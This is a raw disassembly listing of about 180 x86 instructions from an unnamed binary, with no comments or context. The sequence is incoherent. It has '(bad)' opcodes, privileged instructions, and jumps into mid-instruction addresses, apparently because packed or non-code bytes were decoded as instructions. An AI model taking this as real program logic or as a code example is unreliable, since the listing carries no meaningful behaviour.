  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
